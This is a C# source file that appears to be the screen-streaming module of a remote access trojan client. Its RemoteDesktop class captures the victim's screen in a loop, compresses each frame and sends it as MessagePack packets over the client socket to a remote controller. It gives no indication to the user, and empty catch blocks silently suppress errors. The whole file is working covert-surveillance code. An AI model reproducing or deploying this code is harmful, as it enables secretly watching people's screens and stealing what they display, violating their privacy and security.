using Client.MessagePack;
using Client.Sockets;
using StreamLibrary;
using StreamLibrary.UnsafeCodecs;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace Client.Handle_Packet
{
    class RemoteDesktop
    {
        public static bool RemoteDesktopStatus { get; set; }
        public static void CaptureAndSend()
        {
            try
            {
                IUnsafeCodec unsafeCodec = new UnsafeStreamCodec(60);
                while (RemoteDesktopStatus == true)
                {
                    if (!ClientSocket.Client.Connected) RemoteDesktopStatus = false;
                    Bitmap bmp = GetScreen();
                    Rectangle rect = new Rectangle(0, 0, bmp.Width, bmp.Height);
                    Size size = new Size(bmp.Width, bmp.Height);
                    BitmapData bmpData = bmp.LockBits(new Rectangle(0, 0, bmp.Width, bmp.Height), ImageLockMode.ReadWrite, bmp.PixelFormat);

                    using (MemoryStream stream = new MemoryStream(1000000))
                    {
                        unsafeCodec.CodeImage(bmpData.Scan0, rect, size, bmp.PixelFormat, stream);
                        if (stream.Length > 0)
                        {
                            MsgPack msgpack = new MsgPack();
                            msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                            msgpack.ForcePathObject("Stream").SetAsBytes(stream.ToArray());
                            ClientSocket.BeginSend(msgpack.Encode2Bytes());
                        }
                    }
                    bmp.UnlockBits(bmpData);
                    bmp.Dispose();
                }
            }
            catch { }
        }

        public static Bitmap GetScreen()
        {
            Rectangle rect = Screen.AllScreens[0].WorkingArea;
            try
            {
                Bitmap bmpScreenshot = new Bitmap(rect.Width, rect.Height, PixelFormat.Format32bppArgb);
                Graphics gfxScreenshot = Graphics.FromImage(bmpScreenshot);
                gfxScreenshot.CopyFromScreen(0, 0, 0, 0, new Size(bmpScreenshot.Width, bmpScreenshot.Height), CopyPixelOperation.SourceCopy);
                gfxScreenshot.Dispose();
                return bmpScreenshot;
            }
            catch { return new Bitmap(rect.Width, rect.Height); }
        }
    }
}
